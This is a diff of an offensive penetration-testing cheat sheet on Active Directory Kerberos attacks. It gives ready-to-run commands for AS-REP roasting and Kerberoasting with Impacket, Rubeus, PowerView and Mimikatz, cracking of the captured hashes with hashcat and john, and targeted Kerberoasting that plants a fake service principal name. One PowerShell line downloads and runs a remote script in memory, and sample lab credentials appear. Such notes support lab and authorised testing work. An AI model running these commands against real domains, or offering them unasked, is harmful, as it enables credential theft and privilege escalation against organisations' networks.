@@ -20,40 +20,37 @@ With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
 
 ## ASREPRoast
 
-With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetNPUsers.py:
+### Enumeration
+```powershell
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+```
+
+### Linux (Impacket)
 
 ```shell
-# check ASREPRoast for all domain users (credentials required)
+# With credentials
 python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
-python3 GetNPUsers.py COMPANY.local/james:Password123 -request -format john -outputfile /home/ubuntu/Documents/file/dir/asrep.out -dc-ip 172.16.1.20
 
-# check ASREPRoast for a list of users (no credentials required)
-python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
-```
+# No credentials - spray a user list
+GetNPUsers.py <DOMAIN>/ -dc-ip <dc_ip> -no-pass -usersfile valid_ad_users
 
-* attempt with no password&#x20;
-
-```
+# Single user no password
 python3 GetNPUsers.py COMPANY.local/james -no-pass -dc-ip 172.16.1.20
 ```
 
-* Attempt with a userlist of potentially valid users
+### Windows (Rubeus)
 
-```
-python3 GetNPUsers.py COMPANY.local/ -usersfile /home/ubuntu/Documents/htb/dir/users.txt -format hashcat -outputfile /home/ubuntu/Documents/htb/dir/valid-users.out
+```powershell
+.\Rubeus.exe asreproast /user:<user> /nowrap /format:hashcat
+
+# All users in current domain
+.\Rubeus.exe asreproast /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
 ```
 
-With [Rubeus](https://github.com/GhostPack/Rubeus):
+### Cracking
 
 ```shell
-# check ASREPRoast for all users in current domain
-.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
-```
-
-Cracking with dictionary of passwords:
-
-```shell
-hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
+hashcat -m 18200 asrep_hashes /usr/share/wordlists/rockyou.txt
 
 john --wordlist=<passwords_file> <AS_REP_responses_file>
 ```
@@ -70,41 +67,61 @@ john --wordlist=<passwords_file> <AS_REP_responses_file>
 * Great reading:
 * [https://specterops.gitbook.io/ghostpack/rubeus/roasting](https://specterops.gitbook.io/ghostpack/rubeus/roasting)
 
-With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetUserSPNs.py:
+### Enumeration
+```powershell
+# PowerView - find kerberoastable accounts
+Import-Module .\PowerView.ps1
+Get-DomainUser * -SPN | Select samaccountname,ServicePrincipalName
+
+# setspn.exe (built-in)
+setspn.exe -Q */*
+```
+
+### Impacket (Linux)
 
 ```shell
 python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
 python3 GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
 ```
 
-📌[**HackTricks Tip:**](https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast) _If you find this **error** from Linux: **Kerberos SessionError: KRB\_AP\_ERR\_SKEW(Clock skew too great)** it because of your local time, you need to synchronize the host with the DC: **ntpdate \<IP of DC>**_
+If you get **KRB\_AP\_ERR\_SKEW(Clock skew too great)**, sync time with the DC: `ntpdate <IP of DC>`
 
-With [Rubeus](https://github.com/GhostPack/Rubeus):
+### Rubeus
 
 ```shell
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
+
+# Stats first (check RC4 vs AES, prioritize RC4)
+.\Rubeus.exe kerberoast /stats
+
+# Filter for high-value targets
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+
+# Target specific user
+.\Rubeus.exe kerberoast /user:<target> /nowrap
 ```
 
-With **Powershell**:
+### PowerShell
 
-```
-#Invoke-Kerberoast.ps1 IEX Method
+```powershell
+# Invoke-Kerberoast.ps1
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
-#or load this way
 Import-Module .\invoke-kerberoast.ps1
-#basic command 
 Invoke-Kerberoast -Domain active.htb -OutputFormat Hashcat | fl
-#verbose command 
 Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
+
+# PowerView - request ticket for specific user
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
 ```
 
-* Can also acomplish this in native powershell if you have a session&#x20;
-
+### Native PowerShell (.NET)
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/host.domain.local:1433"
 ```
-Add-Type -AssemblyName System.IdentityModelNew -ObjectSystem.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "Service class\Hostname:Port"
-```
 
-Cracking with dictionary of passwords:
+### Cracking
 
 ```shell
 hashcat -m 13100 --force <TGSs_file> <passwords_file>
@@ -112,11 +129,24 @@ hashcat -m 13100 --force <TGSs_file> <passwords_file>
 john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
 ```
 
-### With Invoke-Mimikatz.ps1
+### Mimikatz Ticket Export
 
+```
+mimikatz # kerberos::list /export
+```
 ```
 Import-Module .\Invoke-Mimikatz.ps1
 Invoke-Mimikatz -Command '"kerberos::list /export"'
+```
+
+### Targeted Kerberoasting (via GenericAll/GenericWrite)
+- If you have write access over a user, set a fake SPN then Kerberoast it
+```powershell
+Set-DomainObject -Credential $Cred -Identity <user> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+.\Rubeus.exe kerberoast /user:<user> /nowrap
+
+# Cleanup after cracking
+Set-DomainObject -Credential $Cred -Identity <user> -Clear serviceprincipalname -Verbose
 ```
 
 ### Harvest tickets from Windows
